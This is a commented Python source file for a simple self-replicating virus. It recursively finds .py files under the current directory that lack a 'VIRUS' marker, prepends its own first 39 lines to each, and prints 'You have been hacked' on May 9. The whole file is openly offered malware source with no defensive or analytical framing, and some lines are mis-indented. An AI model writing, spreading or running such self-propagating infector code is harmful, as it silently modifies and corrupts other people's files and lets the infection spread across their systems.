# Tells the computer to use python3 three to run the script
#!/usr/bin/python3
# Import os module
import os
# Import Determine Module
import datetime
# Set the variable Signatur to Virus
SIGNATURE = "VIRUS"
# used to locate the path of the file
def locate(path):
    files_targeted = []
    filelist = os.listdir(path)
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            files_targeted.extend(locate(path+"/"+fname))
        elif fname[-3:] == ".py":
            infected = False
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break
            if infected == False:
                files_targeted.append(path+"/"+fname)
   # This returns the list of files_targeted
    return files_targeted
# The def infect(files_targeted): function is used to infect the files in the list of files_targeted
def infect(files_targeted):
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i,line in enumerate(virus):
        if 0 <= i < 39:
            virusstring += line
   
    # This closes the file    
virus.close
    for fname in files_targeted:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()

# The def detonate(): function is used to detonate the virus
def detonate():
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
# This prints the message
        print("You have been hacked")

# The final three lines of code are used to call the functions.
files_targeted = locate(os.path.abspath(""))
infect(files_targeted)
detonate()
